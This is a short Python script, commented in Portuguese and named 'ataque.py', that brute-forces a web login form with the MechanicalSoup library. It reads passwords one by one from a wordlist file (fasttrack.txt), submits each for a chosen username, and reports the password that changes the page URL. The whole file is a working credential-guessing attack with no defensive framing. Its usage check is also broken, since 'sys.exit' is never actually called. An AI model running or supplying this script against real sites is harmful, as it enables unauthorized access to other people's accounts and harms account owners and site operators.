import mechanicalsoup   # precisa baixar esse cara aqui de algum lugar MechanicalSoup
import sys

browser = mechanicalsoup.StatefulBrowser()

if len(sys.argv) < 3:
    print("Modo de uso: python3 ataque.py + pagina + username")
    sys.exit

site = sys.argv[1]
user = sys.argv[2]

browser.open(site)

password = open("fasttrack.txt", "r")
lines = password.readlines()

def ataque():
    count = 0
    for p in lines:
        count += 1
        browser.select_form('form[action="login.php"]')
        browser['username'] = user
        browser['password'] = p.strip()
        browser.submit_selected()
        resposta = browser.get_url()
        if(resposta != site):
            print(resposta)
            print("Senha "+str(count)+" correta: "+p)
            break
        else:
            print(resposta)
            print("Senha "+str(count)+" incorreta: "+p)

ataque()